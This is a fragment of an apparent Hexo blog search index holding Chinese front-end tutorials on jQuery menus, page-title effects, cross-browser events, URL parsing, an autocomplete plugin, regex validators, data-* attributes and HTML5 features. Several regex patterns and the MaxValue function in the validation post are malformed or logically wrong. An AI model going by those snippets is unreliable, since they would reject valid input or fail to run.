    <content type="text"><![CDATA[&emsp;&emsp;基于jQuery右下角旋转环状菜单代码。这是一款固定在页面的右下角位置，当用户点击了主菜单按钮后，子菜单项会以环状旋转进入页面，并使用animate.css来制作动画效果。效果图如下：实现的代码。html代码：12345678910111213141516171819202122&lt;div class="htmleaf-container"&gt; &lt;div id='ss_menu'&gt; &lt;div&gt; &lt;i class="fa fa-qq"&gt;&lt;/i&gt; &lt;/div&gt; &lt;div&gt; &lt;i class="fa fa-weibo"&gt;&lt;/i&gt; &lt;/div&gt; &lt;div&gt; &lt;i class="fa fa-weixin"&gt;&lt;/i&gt; &lt;/div&gt; &lt;div&gt; &lt;i class="fa fa-renren"&gt;&lt;/i&gt; &lt;/div&gt; &lt;div class='menu'&gt; &lt;div class='share' id='ss_toggle' data-rot='180'&gt; &lt;div class='circle'&gt;&lt;/div&gt; &lt;div class='bar'&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;js代码：12345678910111213141516171819202122232425$(document).ready(function (ev) &#123; var toggle = $('#ss_toggle'); var menu = $('#ss_menu'); var rot; $('#ss_toggle').on('click', function (ev) &#123; rot = parseInt($(this).data('rot')) - 180; menu.css('transform', 'rotate(' + rot + 'deg)'); menu.css('webkitTransform', 'rotate(' + rot + 'deg)'); if (rot / 180 % 2 == 0) &#123; toggle.parent().addClass('ss_active'); toggle.addClass('close'); &#125; else &#123; toggle.parent().removeClass('ss_active'); toggle.removeClass('close'); &#125; $(this).data('rot', rot); &#125;); menu.on('transitionend webkitTransitionEnd oTransitionEnd', function () &#123; if (rot / 180 % 2 == 0) &#123; $('#ss_menu div i').addClass('ss_animate'); &#125; else &#123; $('#ss_menu div i').removeClass('ss_animate'); &#125; &#125;);&#125;);查看演示点击下载&nbsp;]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>js旋转环状菜单</tag>
        <tag>旋转环状菜单代码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JS实现网页标题滚动及标题变换]]></title>
    <url>%2F2015%2F09%2F10%2Fjs%E5%AE%9E%E7%8E%B0%E7%BD%91%E9%A1%B5%E6%A0%87%E9%A2%98%E6%BB%9A%E5%8A%A8%E5%8F%8A%E6%A0%87%E9%A2%98%E5%8F%98%E6%8D%A2%2F</url>
    <content type="text"><![CDATA[大家是否经常看到网页标题来回滚动，以及网页标题来回变动，这种效果是不是很炫，给人的感觉也不错。下面就是我要分享给大家的代码，相互学习、改进已达到我们自己理想的状态。js实现网页标题滚动（源码如下）var msg = document.title; msg = "…" + msg;pos = 0; function scrollMSG() { document.title = msg.substring(pos, msg.length) + msg.substring(0, pos); pos++; if (pos &gt; msg.length) pos = 0 window.setTimeout("scrollMSG()",400); } scrollMSG(); &nbsp;js实现网页标题变动（源码如下）// var step=0; var _title=document.title; //获取网页标题 var space=''; for(var i=0;i&lt;=_title.length;i++)space+=' '; //根据标题长度生产相应的空字符 function flash_title() //核心函数 { step++ if (step==3) {step=1} if (step==1) {document.title=space} if (step==2) {document.title=_title} setTimeout("flash_title()",500); } flash_title(); PS:这两种效果还不错，大家可以试试。。&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js标题变换</tag>
        <tag>js网页标题滚动</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js跨浏览器常用事件]]></title>
    <url>%2F2015%2F09%2F10%2Fjs%E8%B7%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B8%B8%E7%94%A8%E4%BA%8B%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[//跨浏览器添加事件123456789function addEvent(obj, type, fn) &#123; if (obj.addEventListener) &#123; obj.addEventListener(type, fn, false); &#125; else if (obj.attachEvent) &#123; obj.attachEvent('on' + type, function() &#123; fn.call(obj); &#125;); &#125;&#125;&nbsp;//跨浏览器移除事件1234567function removeEvent(obj, type, fn) &#123; if (obj.removeEventListener) &#123; obj.removeEventListener(type, fn, false); &#125; else if (obj.detachEvent) &#123; obj.detachEvent('on' + type, fn); &#125;&#125;&nbsp;//跨浏览器阻止默认行为12345678function preDef(evt) &#123; var e = evt || window.event; if (e.preventDefault) &#123; e.preventDefault(); &#125; else &#123; e.returnValue = false; &#125;&#125;&nbsp;//跨浏览器获取目标对象1234567function getTarget(evt) &#123; if (evt.target) &#123; //W3C return evt.target; &#125; else if (window.event.srcElement) &#123; //IE return window.event.srcElement; &#125;&#125;&nbsp;//跨浏览器获取字符编码12345678function getCharCode(evt) &#123; var e = evt || window.event; if (typeof e.charCode == 'number') &#123; return e.charCode; &#125; else &#123; return e.keyCode; &#125;&#125;&nbsp;]]></content>
      <categories>
        <category>前端兼容</category>
      </categories>
      <tags>
        <tag>js跨浏览器事件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript获取URL资源详解]]></title>
    <url>%2F2015%2F09%2F10%2Fjavascript%E8%8E%B7%E5%8F%96url%E8%B5%84%E6%BA%90%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[URL即统一资源定位符 (Uniform Resource Locator, URL)，完整的URL由这几个部分构成：scheme://host:port/path?query#fragmentscheme:通信协议，常用的http,ftp,maito等。host:主机，服务器(计算机)域名系统 (DNS) 主机名或 IP 地址。port:端口号，整数，可选，省略时使用方案的默认端口，如http的默认端口为80，https的默认端口是443。path:路径，由零或多个”/“符号隔开的字符串，一般用来表示主机上的一个目录或文件地址。query:查询，可选，用于给动态网页（如使用CGI、ISAPI、PHP/JSP/ASP/ASP.NET等技术制作的网页）传递参数，可有多个参数，用”&amp;”符号隔开，每个参数的名和值用”=”符号隔开。fragment:信息片断，字符串，用于指定网络资源中的片断。例如一个网页中有多个名词解释，可使用fragment直接定位到某一名词解释。(也称为锚点)这个标志点不是统一资源标志符的一部分，而是让用户浏览器在获得了文件后来导航用的，因此它实际上不被送到服务器。下面我们举例一个URL，然后获得它的各个组成部分。http://bbs.grycheng.com/forum.php?gid=42window.location.href 可以获得整个URL字符串（在浏览器中就是完整的地址栏）。var test = window.location.href;alert(test);程序返回http://bbs.grycheng.com/forum.php?gid=42window.location.protocol 可以获得 URL 的协议部分var test = window.location.protocol;alert(test);程序返回 http:window.location.host 可以获得 URL 的主机部分var test = window.location.host;alert(test);程序返回 bbs.aseoe.comwindow.location.port 可以获得 URL 的端口部分var test = window.location.port;alert(test);如果采用默认的80端口(update:即使添加了:80)，那么返回值并不是默认的80而是空字符。window.location.pathname 获得 URL 的路径部分（就是文件地址）var test = window.location.pathname;alert(test);window.location.search获得查询（参数）部分，除了给动态语言赋值以外，我们同样可以给静态页面，并使用javascript来获得相信应的参数值。var test = window.location.search;alert(test);window.location.hash 获得锚点。var test = window.location.hash;alert(test);]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>JavaScript获取URL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于jquery的智能提示控件intellSeach.js]]></title>
    <url>%2F2015%2F09%2F09%2F%E5%9F%BA%E4%BA%8Ejquery%E7%9A%84%E6%99%BA%E8%83%BD%E6%8F%90%E7%A4%BA%E6%8E%A7%E4%BB%B6intellseach-js%2F</url>
    <content type="text"><![CDATA[一、需求&emsp;&emsp;我们经常会遇到【站内搜索】的需求，为了提高用户体验，我们希望能做到像百度那样的即时智能提示。例如：某公司人事管理系统，想搜索李XX，只要输入“李”，系统自然会提示一些姓李的员工，这样方便用户使用。说白了，就是用户边输入，系统会提示相关的结果；或者，当用户点击搜索框时，就推荐一些内容，如360、百度都会提示今天的主要新闻或搜索量大的内容。&emsp;&emsp;jquery 已经有一个这样的插件了，叫 autocomplete, 但我觉得不好用。关于autocomplete的介绍也很多，有兴趣的朋友可以去试试。&emsp;&emsp;看标题就知道，这里只是分享一个插件，不会讨论后台搜索的相关算法和过程，也就是说，后台返回特定格式的数据，控件负责渲染结果呈现。ok,先看一下效果图：效果一：效果图二：样式与控件无关，只需要一个 input text 就可以了。二、参数说明&emsp;&emsp;控件以json格式作为传输格式。参数比较多，大部分都有默认值（具体看源码），有些可能不常用，保持默认即可。如下：url: 请求地址。如：Handler.ashx, 后台获取数据的地址property: 要显示的json对象的属性。如果我们直接返回[“tom”,”tom cat”,”tom2”] 这样的形式，那么该属性可以不用设置；但有时候我们会返回[{“Name”:”tom”,”ID”:”001”},{“Name”:”tom cat”,”ID”:”002”},{“Name”:”tom2”,”ID”:”003”}] 这样的形式，显示的是Name，那么设置该属性为”Name”即可。至于我们想在点击的时候获得点击的项的ID,通过点击事件即可。itemNumber: 显示的项数目。isEmptyRequest: focus时，空白是否发起请求。就像前面说的，如果点击搜索框时(此时没有内容)，想要推荐一些内容，设置该属性为true，即会发起请求。defaultValue: 默认值。通常会是：“请输入关键词…” 这类的提示。width: 下拉列表宽度。aligner: 要对齐的元素。maxHeight: 最大高度。如果设置该高度，超过时就会出现滚动条。ajax:{timeout: 超时时间cache: 是否缓存},event:{setData: 发送请求前触发。用于设置参数itemClick: 点击项触发enterKeydown: 按下enter键触发beforeRender: 所有项呈现前触发endRender: 所有项呈现后触发itemBeforeRender: 项呈现前触发itemAfterRender: 项呈现后触发beforeSend: 发送请求前触发。用户设置请求头部参数等，相当于jquery ajax 的 beforeSend。}event 里的方法都会在适当的时候触发，需要注意的是，所有方法都接收一个参数，该参数是一个对象，有4个属性，某些情况如果没有该属性的，则为空。包括如下属性：jthis: input 的 jQuery 对象。jItem: 项的 jQuery 对象。data: 返回的 json 字符串。如果在前台需要对返回 json 再进行处理，那么可以通过 data 属性获得，处理完成后，需要将 json 字符串 return。event: 事件对象，如按下 enter 时的事件对象。三、例子使用例子：123456789101112131415161718192021$("#search").intellSearch(&#123; url:"Handler.ashx", property:"Name", itemNumber:5, isEmptyRequest:false, defaultValue:"请输入关键字...", width:$("#search").width() + 2, maxHeight:-1, event:&#123; itemClick:function(obj)&#123; alert(obj.item.ID); &#125;, enterKeydown:function(obj)&#123; if(obj.item)&#123; alert("有当前项"); &#125;else&#123; alert("没有当前项"); &#125; &#125; &#125; &#125;);四、总结&emsp;&emsp; 如果你还有自己的逻辑需要处理，也支持链式调用，大可以这样写 $(“#search”).intellSearch({参数…}).focus(function(){你的处理…});&emsp;&emsp;分享该插件希望能帮助到有需要的朋友，主要用于学习。由于是v1.0，可能还有一些bug，有发现的朋友也可以告诉我，我会及时修正。js附源代码下载样式123.intellResult&#123;margin:0;padding:0;background:#fff;border:1px solid #b6b6b6;clear:both;z-index:999;display:none;&#125;.intellResult li&#123;margin:0;padding:0;padding:5px 15px;height:20px;line-height:20px;overflow:hidden;text-overflow:ellipsis;cursor:pointer;white-space:nowrap;&#125;.intellResult li.cur&#123;background:#E5E0E0;&#125;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>intellSeach.js</tag>
        <tag>js智能提示</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js正则表达式验证大全]]></title>
    <url>%2F2015%2F09%2F09%2Fjs%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E9%AA%8C%E8%AF%81%E5%A4%A7%E5%85%A8%2F</url>
    <content type="text"><![CDATA[//判断输入内容是否为空123456function IsNull()&#123;var str = document.getElementById('str').value.trim();if(str.length==0)&#123;alert('对不起，文本框不能为空或者为空格!');//请将“文本框”改成你需要验证的属性名称!&#125;&#125;//判断日期类型是否为YYYY-MM-DD格式的类型123456789function IsDate()&#123;var str = document.getElementById('str').value.trim();if(str.length!=0)&#123;var reg = /^(\d&#123;1,4&#125;)(-|\/)(\d&#123;1,2&#125;)\2(\d&#123;1,2&#125;)$/;var r = str.match(reg);if(r==null)alert('对不起，您输入的日期格式不正确!'); //请将“日期”改成你需要验证的属性名称!&#125;&#125;//判断日期类型是否为YYYY-MM-DD hh:mm:ss格式的类型123456789function IsDateTime()&#123;var str = document.getElementById('str').value.trim();if(str.length!=0)&#123;var reg = /^(\d&#123;1,4&#125;)(-|\/)(\d&#123;1,2&#125;)\2(\d&#123;1,2&#125;) (\d&#123;1,2&#125;):(\d&#123;1,2&#125;):(\d&#123;1,2&#125;)$/;var r = str.match(reg);if(r==null)alert('对不起，您输入的日期格式不正确!'); //请将“日期”改成你需要验证的属性名称!&#125;&#125;//判断日期类型是否为hh:mm:ss格式的类型12345678910function IsTime()&#123;var str = document.getElementById('str').value.trim();if(str.length!=0)&#123;reg=/^((20|21|22|23|[0-1]\d)\:[0-5][0-9])(\:[0-5][0-9])?$/if(!reg.test(str))&#123;alert("对不起，您输入的日期格式不正确!");//请将“日期”改成你需要验证的属性名称!&#125;&#125;&#125;//判断输入的字符是否为英文字母12345678910function IsLetter()&#123;var str = document.getElementById('str').value.trim();if(str.length!=0)&#123;reg=/^[a-zA-Z]+$/;if(!reg.test(str))&#123;alert("对不起，您输入的英文字母类型格式不正确!");//请将“英文字母类型”改成你需要验证的属性名称!&#125;&#125;&#125;//判断输入的字符是否为整数12345678910function IsInteger()&#123;var str = document.getElementById('str').value.trim();if(str.length!=0)&#123;reg=/^[-+]?\d*$/;if(!reg.test(str))&#123;alert("对不起，您输入的整数类型格式不正确!");//请将“整数类型”要换成你要验证的那个属性名称！&#125;&#125;&#125;//判断输入的字符是否为双精度12345678910function IsDouble(val)&#123;var str = document.getElementById('str').value.trim();if(str.length!=0)&#123;reg=/^[-\+]?\d+(\.\d+)?$/;if(!reg.test(str))&#123;alert("对不起，您输入的双精度类型格式不正确!");//请将“双精度类型”要换成你要验证的那个属性名称！&#125;&#125;&#125;//判断输入的字符是否为:a-z,A-Z,0-912345678910function IsString()&#123;var str = document.getElementById('str').value.trim();if(str.length!=0)&#123;reg=/^[a-zA-Z0-9_]+$/;if(!reg.test(str))&#123;alert("对不起，您输入的字符串类型格式不正确!");//请将“字符串类型”要换成你要验证的那个属性名称！&#125;&#125;&#125;//判断输入的字符是否为中文12345678910function IsChinese()&#123;var str = document.getElementById('str').value.trim();if(str.length!=0)&#123;reg=/^[\u0391-\uFFE5]+$/;if(!reg.test(str))&#123;alert("对不起，您输入的字符串类型格式不正确!");//请将“字符串类型”要换成你要验证的那个属性名称！&#125;&#125;&#125;//判断输入的EMAIL格式是否正确12345678910function IsEmail()&#123;var str = document.getElementById('str').value.trim();if(str.length!=0)&#123;reg=/^\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*$/;if(!reg.test(str))&#123;alert("对不起，您输入的字符串类型格式不正确!");//请将“字符串类型”要换成你要验证的那个属性名称！&#125;&#125;&#125;//判断输入的邮编(只能为六位)是否正确12345678910function IsZIP()&#123;var str = document.getElementById('str').value.trim();if(str.length!=0)&#123;reg=/^\d&#123;6&#125;$/;if(!reg.test(str))&#123;alert("对不起，您输入的字符串类型格式不正确!");//请将“字符串类型”要换成你要验证的那个属性名称！&#125;&#125;&#125;//判断输入的数字不大于某个特定的数字12345678910111213function MaxValue()&#123;var val = document.getElementById('str').value.trim();if(str.length!=0)&#123;reg=/^[-+]?\d*$/;if(!reg.test(str))&#123;//判断是否为数字类型if(val&gt;parseInt('123')) //“123”为自己设定的最大值&#123;alert('对不起，您输入的数字超出范围');//请将“数字”改成你要验证的那个属性名称！&#125;&#125;&#125;&#125;1234567Phone : /^((\(\d&#123;2,3&#125;\))|(\d&#123;3&#125;\-))?(\(0\d&#123;2,3&#125;\)|0\d&#123;2,3&#125;-)?[1-9]\d&#123;6,7&#125;(\-\d&#123;1,4&#125;)?$/Mobile : /^((\(\d&#123;2,3&#125;\))|(\d&#123;3&#125;\-))?13\d&#123;9&#125;$/Url : /^http:\/\/[A-Za-z0-9]+\.[A-Za-z0-9]+[\/=\?%\-&amp;amp;_~`@[\]\':+!]*([^&lt;&gt;\"\"])*$/IdCard : /^\d&#123;15&#125;(\d&#123;2&#125;[A-Za-z0-9])?$/QQ : /^[1-9]\d&#123;4,8&#125;$/某种特殊金额：/^((\d&#123;1,3&#125;(,\d&#123;3&#125;)*)|(\d+))(\.\d&#123;2&#125;)?$/ //说明：除“XXX XX,XXX XX,XXX.00”格式外//为上面提供各个JS验证方法提供.trim()属性123String.prototype.trim=function()&#123;return this.replace(/(^\s*)|(\s*$)/g, "");&#125;调用：123456789101112131415161718192021222324252627282930&lt;input type="text" name="str" &gt;&lt;input type="button" value=" 确定 " onClick=""&gt; //onClick中写自己要调用的JS验证函数&lt;script language="javascript" type="text/javascript"&gt;var patterms = new Object();//验证IPpatterms.ip = /^(\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5])(\.(\d&#123;1,2&#125;|1\d\d|2[0-4]\d|25[0-5]))&#123;3&#125;$/;//验证EMAILpatterms.email = /^[a-zA-Z0-9_-]+@[a-zA-Z0-9_-]+(\.[a-zA-Z0-9_-]+)+$/;//验证日期格式2009-07-13patterms.date = /^\d&#123;4&#125;-(0?[1-9]|1[0-2])-(0?[1-9]|[1-2]\d|3[0-1])$/;//验证时间格式16:55:39patterms.time = new RegExp("^([0-1]\\d|2[0-3]):[0-5]\\d:[0-5]\\d$");//验证函数function verify(str,pat)&#123;var thePat;thePat = patterms[pat];if(thePat.test(str))&#123;return true;&#125;else&#123;return false;&#125;&#125;//测试alert(verify("asidycom@163.com","email")+","+verify("192.168.1.1","ip")+","+verify("16:55:39","time")+","+verify("2009-07-13","date")+","+verify("192.168","ip"));&nbsp;验证数字：^[0-9]*$验证n位的数字：^\d{n}$验证至少n位数字：^\d{n,}$验证m-n位的数字：^\d{m,n}$验证零和非零开头的数字：^(0|[1-9][0-9]*)$验证有两位小数的正实数：^[0-9]+(.[0-9]{2})?$验证有1-3位小数的正实数：^[0-9]+(.[0-9]{1,3})?$验证非零的正整数：^+?[1-9][0-9]*$验证非零的负整数：^-[1-9][0-9]*$验证非负整数（正整数 + 0） ^\d+$验证非正整数（负整数 + 0） ^((-\d+)|(0+))$验证长度为3的字符：^.{3}$验证由26个英文字母组成的字符串：^[A-Za-z]+$验证由26个大写英文字母组成的字符串：^[A-Z]+$验证由26个小写英文字母组成的字符串：^[a-z]+$验证由数字和26个英文字母组成的字符串：^[A-Za-z0-9]+$验证由数字、26个英文字母或者下划线组成的字符串：^\w+$验证用户名或昵称经常用到: ^[\u4e00-\u9fa5A-Za-z0-9-_]*$ 只能中英文，数字，下划线，减号验证用户密码:^[a-zA-Z]\w{5,17}$ 正确格式为：以字母开头，长度在6-18之间，只能包含字符、数字和下划线。验证是否含有 ^%&amp;’,;=?$\” 等字符：[^%&amp;’,;=?$\x22]+验证汉字：^[\u4e00-\u9fa5],{0,}$验证Email地址：^\w+[-+.]\w+)@\w+([-.]\w+).\w+([-.]\w+)*$验证InternetURL：^http://([\w-]+\.)+[\w-]+(/[\w-./?%&amp;=]*)?$ ；^[a-zA-z]+://(w+(-w+))(.(w+(-w+)))(?S)?$验证电话号码：^((\d{3,4})|\d{3,4}-)?\d{7,8}$：–正确格式为：XXXX-XXXXXXX，XXXX-XXXXXXXX，XXX-XXXXXXX，XXX-XXXXXXXX，XXXXXXX，XXXXXXXX。验证身份证号（15位或18位数字）：^\d{15}|\d{}18$验证一年的12个月：^(0?[1-9]|1[0-2])$ 正确格式为：“01”-“09”和“1”“12”验证一个月的31天：^((0?[1-9])|((1|2)[0-9])|30|31)$ 正确格式为：01、09和1、31。整数：^-?\d+$非负浮点数（正浮点数 + 0）：^\d+(.\d+)?$正浮点数 ^(([0-9]+.[0-9][1-9][0-9])|([0-9][1-9][0-9].[0-9]+)|([0-9][1-9][0-9]))$非正浮点数（负浮点数 + 0） ^((-\d+(.\d+)?)|(0+(.0+)?))$负浮点数 ^(-(([0-9]+.[0-9][1-9][0-9])|([0-9][1-9][0-9].[0-9]+)|([0-9][1-9][0-9])))$浮点数 ^(-?\d+)(.\d+)?$由于手机号段的不断更新，以前的正则表达式已经无法满足需求。重新编写这条表达式，var regex = {mobile: /^0?(13[0-9]|15[012356789]|18[0236789]|14[57])[0-9]{8}$/}表达式分析：“/”代表一个正则表达式。“^”代表字符串的开始位置，“$”代表字符串的结束位置。“?”代表匹配前面的字符一个或零个，所以这里0?的意思是手机号码可以以0开头或不以0开头。接下的部分验证11位的手机号码，先从13开始，因为从130-139都有所以可选区间是[0-9]，15开头的号码没有154所以[]里面没有4这个数字，当然也可以写成[0-35-9]，下面18和14开的号码同上。小括号括起来的代表一个子表达式，里面是4个可选分支分别用“|”来区分开来，在正则中“|”的优先级是最低的，这里每个分支匹配的都是3个字符（一个[]只能匹配一个字符，里面是可选的意思），也就是手机号码的前3位数字，那么后面还有8位数字需要匹配，可以是0-9的任意字符，所以是“[0-9]{8}”，{}中的数字代表匹配前面字符的个数。分析完毕。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用 data-* 属性来嵌入自定义数据]]></title>
    <url>%2F2015%2F09%2F09%2F%E4%BD%BF%E7%94%A8-data-%E5%B1%9E%E6%80%A7%E6%9D%A5%E5%B5%8C%E5%85%A5%E8%87%AA%E5%AE%9A%E4%B9%89%E6%95%B0%E6%8D%AE%2F</url>
    <content type="text"><![CDATA[1. Html 实例12345&lt;ul&gt;&lt;li data-animal-type="bird"&gt;Owl&lt;/li&gt;&lt;li data-animal-type="fish"&gt;Salmon&lt;/li&gt;&lt;li data-animal-type="spider"&gt;Tarantula&lt;/li&gt;&lt;/ul&gt;2.浏览器支持IEFireFoxSafariOpera支持支持支持支持支持支持支持支持3.定义和用法data-* 属性用于存储页面或应用程序的私有自定义数据。data-* 属性赋予我们在所有 HTML 元素上嵌入自定义 data 属性的能力。存储的（自定义）数据能够被页面的 JavaScript 中利用，以创建更好的用户体验（不进行 Ajax 调用或服务器端数据库查询）。data-* 属性包括两部分：属性名不应该包含任何大写字母，并且在前缀”data-“之后必须有至少一个字符属性值可以是任意字符串注释：用户代理会完全忽略前缀为 “data-“ 的自定义属性。语法HTML adta-*属性4.外加信息&emsp;&emsp;HTML标签可以添加自定义属性来存储和操作数据。但这样做会导致html语法上不符合Html规范。&emsp;HTML5规范里增加了一个自定义data属性，自定义data属性的用法非常的简单，就可以往HTML标签上添加任意以”data-“开头的属性，这些属性页面上是不显示的，它不会影响到你的页面布局和风格，但它却是可读可写的。下面的一个代码片段是一个有效的HTML5标记：1&lt;div id="item" data-id='123'&gt;11111&lt;/div&gt;&emsp;可是，怎么来读取这些数据呢？你当然可以遍历页面元素来读取你想要的属性，但jquery已经内置了方法来操作这些属性。使用jQuery的.data()方法来访问这些”data-*”属性。其中一个方法就是 .data(obj)，这个方法是在jQuery1.4.3版本后出现的，它能返回相应的data属性。举个例子，你可以用下面的写法读取data-id属性值–123：1var myid= jQuery("#item").data('id');你还可以在”data-*” 属性里使用json语法，1&lt;div id="item" data-id='&#123;"game":"on"&#125;'&gt;&lt;/div&gt;&emsp;&emsp;你可以通过js直接访问这个数据，通过json的key值，你能得到相应的value：1var gameStatus= jQuery("#item").data('id').game;&emsp;&emsp;你也可以通过.data(key,value)方法直接给”data-*“属性赋值。一个重要的你要注意的事情是，这些”data-*“属性应该和它所在的元素有一定的关联，不要把它当成存放任意东西的存储工具。尽管”data-*“ 是HTML5才出现的属性，但jquery是通用的，所以，在非HTML5的页面或浏览器里，你仍然可以使用.data(obj)方法来操作”data-*” 数据。]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>data-* 自定义属性</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTML5的新特性及技巧分享总结]]></title>
    <url>%2F2015%2F09%2F08%2Fhtml5%E7%9A%84%E6%96%B0%E7%89%B9%E6%80%A7%E5%8F%8A%E6%8A%80%E5%B7%A7%E5%88%86%E4%BA%AB%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[1. 新的Doctype尽管使用&lt;!DOCTYPE html&gt;，即使浏览器不懂这句话也会按照标准模式去渲染2. Figure元素用和来语义化地表示带标题的图片123456&lt;figure&gt;&lt;img src="path/to/image" alt="About image" /&gt;&lt;figcaption&gt;&lt;p&gt;This is an image of something interesting. &lt;/p&gt;&lt;/figcaption&gt;&lt;/figure&gt;3. 重新定义的已经被重新定义了，现在被用来表示小的排版，如网站底部的版权声明4. 去掉link和script标签里面的type属性5. 加/不加 括号HTML5没有严格的要求属性必须加引号，闭合不闭合，但是建议加上引号和闭合标签6. 让你的内容可编辑，只需要加一个contenteditable属性7. Email Inputs如果我们给Input的type设置为email，浏览器就会验证这个输入是否是email类型，当然不能只依赖前端的校验，后端也得有相应的校验8. Placeholders这个input属性的意义就是不必通过javascript来做placeholder的效果了9. Local Storage使用Local Storage可以永久存储大的数据片段在客户端（除非主动删除），目前大部分浏览器已经支持，在使用之前可以检测一下window.localStorage是否存在10. 语义化的header和footer11. 更多的HTML5表单特性12. IE和HTML5默认的，HTML5新元素被以inline的方式渲染，不过可以通过下面这种方式让其以block方式渲染123header, footer, article, section, nav, menu, hgroup &#123;display: block;&#125;不幸的是IE会忽略这些样式，可以像下面这样fix:123456document.createElement("article");document.createElement("footer");document.createElement("header");document.createElement("hgroup");document.createElement("nav");document.createElement("menu");13. hgroup一般在header里面用来将一组标题组合在一起，如123456&lt;header&gt;&lt;hgroup&gt;&lt;h1&gt; Recall Fan Page &lt;/h1&gt;&lt;h2&gt; Only for people who want the memory of a lifetime. &lt;/h2&gt;&lt;/hgroup&gt;&lt;/header&gt;14. Required属性required属性定义了一个input是否是必须的，你可以像下面这样声明123&lt;input type=”text” name=”someInput” required&gt;//或者&lt;input type=”text” name=”someInput” required=”required”&gt;15. Autofocus属性正如它的词义，就是聚焦到输入框里面1&lt;input type=”text” name=”someInput” placeholder=”Douglas Quaid” required autofocus&gt;16. Audio支持HTML5提供了&lt;audio&gt;标签，你不需要再按照第三方插件来渲染音频，大多数现代浏览器提供了对于HTML5 Audio的支持，不过目前仍旧需要提供一些兼容处理，如12345&lt;audio autoplay="autoplay" controls="controls"&gt;&lt;source src="file.ogg" /&gt;&lt;!--FF--&gt;&lt;source src="file.mp3" /&gt;&lt;!--Webkit--&gt;&lt;a href="file.mp3"&gt;Download this file.&lt;/a&gt;&lt;/audio&gt;17. Video支持和Audio很像，标签提供了对于video的支持，由于HTML5文档并没有给video指定一个特定的编码，所以浏览器去决定要支持哪些编码，导致了很多不一致。Safari和IE支持H.264编码的格式，Firefox和Opera支持Theora和Vorbis编码的格式，当使用HTML5 video的时候，你必须都提供：12345&lt;video controls preload&gt;&lt;source src="cohagenPhoneCall.ogv" type="video/ogg; codecs=´vorbis, theora´" /&gt;&lt;source src="cohagenPhoneCall.mp4" type="video/mp4; ´codecs=´avc1.42E01E, mp4a.40.2´" /&gt;&lt;p&gt; Your browser is old. &lt;a href="cohagenPhoneCall.mp4"&gt;Download this video instead.&lt;/a&gt; &lt;/p&gt;&lt;/video&gt;18. 预加载视频preload属性就像它的字面意思那么简单，你需要决定是否需要在页面加载的时候去预加载视频1&lt;video preload&gt;19. 显示视频控制1&lt;video preload controls&gt;20. 正则表达式由于pattern属性，我们可以在你的markup里面直接使用正则表达式了12345&lt;form action="" method="post"&gt;&lt;label for="username"&gt;Create a Username: &lt;/label&gt;&lt;input type="text" name="username" id="username" placeholder="4 &lt;&gt; 10" pattern="[A-Za-z]&#123;4,10&#125;" autofocus required&gt;&lt;button type="submit"&gt;Go &lt;/button&gt;&lt;/form&gt;21. 检测属性支持除了Modernizr之外我们还可以通过javascript简单地检测一些属性是否支持，如：12345&lt;script&gt;if (!´pattern´ in document.createElement(´input´) ) &#123;// do client/server side validation&#125;&lt;/script&gt;22. Mark元素把&lt;mark&gt;元素看做是高亮的作用，当我选择一段文字的时候，javascript对于HTML的markup效果应该是这样的：12&lt;h3&gt; Search Results &lt;/h3&gt;&lt;p&gt; They were interrupted, just after Quato said, &lt;mark&gt;”Open your Mind”&lt;/mark&gt;. &lt;/p&gt;23. 什么时候用HTML5已经引入了这么多元素，那么div我们还要用吗？div你可以在没有更好的元素的时候去用。24. 想立即使用HTML5?不要等2022了，现在就可以使用了，just do it.25. 哪些不是HTML51)SVG2)CSS33)Geolocation4)Client Storage5)Web Sockets26. Data属性CSS中使用：123456789&lt;style&gt;h1:hover:after &#123;content: attr(data-hover-response);color: black;position: absolute;left: 0;&#125;&lt;/style&gt;&lt;h1 data-hover-response=”I Said Don’t Touch Me!”&gt; Don’t Touch Me &lt;/h1&gt;27. Output元素&lt;output&gt;元素用来显示计算结果，也有一个和label一样的for属性28. 用Range Input来创建滑块HTML5引用的range类型可以创建滑块，它接受min, max, step和value属性可以使用css的:before和:after来显示min和max的值1234&lt;input type="range" name="range" min="0" max="10" step="1" value=""&gt;input[type=range]:before &#123; content: attr(min); padding-right: 5px;&#125;input[type=range]:after &#123; content: attr(max); padding-left: 5px;&#125;]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>html5</tag>
        <tag>html5新特效</tag>
        <tag>html新特性</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web前端开发学习流程]]></title>
    <url>%2F2015%2F09%2F08%2Fweb%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0%E6%B5%81%E7%A8%8B%2F</url>
